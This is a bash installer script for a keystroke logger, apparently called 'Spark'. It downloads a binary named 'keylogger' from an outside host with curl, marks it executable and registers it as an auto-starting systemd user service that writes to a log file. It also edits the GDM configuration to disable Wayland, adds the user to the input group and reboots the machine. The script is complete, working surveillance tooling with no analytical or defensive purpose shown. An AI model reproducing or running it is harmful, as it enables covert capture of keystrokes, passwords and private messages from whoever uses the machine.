#!/bin/bash

# Variables
APP_URL="https://panakeos.icu/app/u64/keylogger"
ORIGINAL_USER=$(logname)
ORIGINAL_HOME=$(eval echo "~$ORIGINAL_USER")
CONFIG_DIR="$ORIGINAL_HOME/.config/spark"
BINARY_PATH="$CONFIG_DIR/keylogger"
LOG_FILE="$CONFIG_DIR/keylogger.log"
SERVICE_NAME="spark-keylogger"
SERVICE_FILE="$ORIGINAL_HOME/.config/systemd/user/$SERVICE_NAME.service"
DISPLAY_ENV=${DISPLAY:-:0}
XDG_SESSION_TYPE=${XDG_SESSION_TYPE:-$(loginctl show-session "$(loginctl | grep "$ORIGINAL_USER" | awk '{print $1}')" -p Type | cut -d= -f2)}

echo "Detected user: $ORIGINAL_USER"
echo "Detected home directory: $ORIGINAL_HOME"
echo "Detected display: $DISPLAY_ENV"
echo "Detected XDG_SESSION_TYPE: $XDG_SESSION_TYPE"

# Function to ensure X11 session
ensure_x11_session() {
    if [ "$XDG_SESSION_TYPE" = "wayland" ]; then
        echo "Current session type is Wayland. Switching to X11..."
        if [ -f /etc/gdm3/custom.conf ]; then
            echo "Updating GDM configuration to enable X11..."
            sed -i 's/^#WaylandEnable=false/WaylandEnable=false/' /etc/gdm3/custom.conf || {
                echo "Error: Failed to update GDM configuration. Exiting."
                exit 1
            }
            echo "GDM updated. Please log out and select the 'Ubuntu on Xorg' or 'GNOME on Xorg' session from the login screen."            

            sudo reboot
        else
            echo "Unsupported display manager. Manual configuration required for X11."
            exit 1
        fi
    else
        echo "Session type is already X11. Proceeding with installation."
    fi
}

sudo usermod -aG input $ORIGINAL_USER

# Step 0: Ensure X11 Session
ensure_x11_session


# Define the file path
XAUTH_FILE="$ORIGINAL_HOME/.Xauthority"

# Check if the file exists, and create it if not
if [ ! -f "$XAUTH_FILE" ]; then
    touch "$XAUTH_FILE"
    echo "Created $XAUTH_FILE"
    xauth add $DISPLAY_ENV . $(mcookie)
    sudo chown $ORIGINAL_USER:$ORIGINAL_USER $XAUTH_FILE
    sudo reboot
fi


# Step 1: Create Configuration Directory
echo "Creating configuration directory at $CONFIG_DIR..."
sudo -u "$ORIGINAL_USER" mkdir -p "$CONFIG_DIR" || {
    echo "Error: Failed to create configuration directory. Exiting."
    exit 1
}



# Step 2: Download the Binary File
echo "Downloading the binary file from $APP_URL..."
sudo -u "$ORIGINAL_USER" curl -fsSL -o "$BINARY_PATH" "$APP_URL" || {
    echo "Error: Failed to download the binary file. Exiting."
    exit 1
}

# Step 3: Make the Binary Executable
echo "Making the binary executable..."
sudo -u "$ORIGINAL_USER" chmod +x "$BINARY_PATH" || {
    echo "Error: Failed to make the binary executable. Exiting."
    exit 1
}

# Step 4: Install Dependencies
echo "Installing dependencies..."
apt install -y xdotool xclip || {
    echo "Error: Failed to install dependencies. Exiting."
    exit 1
}

# Step 5: Create or Update User Systemd Service File
echo "Creating user systemd service file at $SERVICE_FILE..."
sudo -u "$ORIGINAL_USER" mkdir -p "$ORIGINAL_HOME/.config/systemd/user"
cat <<EOL | sudo -u "$ORIGINAL_USER" tee "$SERVICE_FILE" > /dev/null
[Unit]
Description=Spark Keylogger Service
After=graphical-session.target

[Service]
Type=simple
ExecStart=$BINARY_PATH $ORIGINAL_HOME
Restart=on-failure
Environment=DISPLAY=$DISPLAY_ENV
Environment=XAUTHORITY=$ORIGINAL_HOME/.Xauthority
StandardOutput=append:$LOG_FILE
StandardError=append:$LOG_FILE
Environment=HOME=$ORIGINAL_HOME

[Install]
WantedBy=default.target
EOL

if [ $? -ne 0 ]; then
    echo "Error: Failed to create the user service file. Exiting."
    exit 1
fi

# Step 6: Reload and Enable the User Service
echo "Reloading user systemd daemon..."
sudo -u "$ORIGINAL_USER" XDG_RUNTIME_DIR="/run/user/$(id -u "$ORIGINAL_USER")" \
DBUS_SESSION_BUS_ADDRESS="unix:path=$XDG_RUNTIME_DIR/bus" \
systemctl --user daemon-reload || {
    echo "Error: Failed to reload user systemd daemon. Exiting."
    exit 1
}

echo "Enabling the $SERVICE_NAME service..."
sudo -u "$ORIGINAL_USER" XDG_RUNTIME_DIR="/run/user/$(id -u "$ORIGINAL_USER")" \
DBUS_SESSION_BUS_ADDRESS="unix:path=$XDG_RUNTIME_DIR/bus" \
systemctl --user enable "$SERVICE_NAME" || {
    echo "Error: Failed to enable the user service. Exiting."
    exit 1
}

echo "Starting the updated $SERVICE_NAME service..."
sudo -u "$ORIGINAL_USER" XDG_RUNTIME_DIR="/run/user/$(id -u "$ORIGINAL_USER")" \
DBUS_SESSION_BUS_ADDRESS="unix:path=$XDG_RUNTIME_DIR/bus" \
systemctl --user start "$SERVICE_NAME" || {
    echo "Error: Failed to start the user service. Exiting."
    exit 1
}

# Step 7: Verify the Updated User Service
echo "Verifying $SERVICE_NAME service status..."
sudo -u "$ORIGINAL_USER" systemctl --user status "$SERVICE_NAME"

echo "Setup completed successfully! If you were on Wayland, log out and switch to an X11 session before using the keylogger."
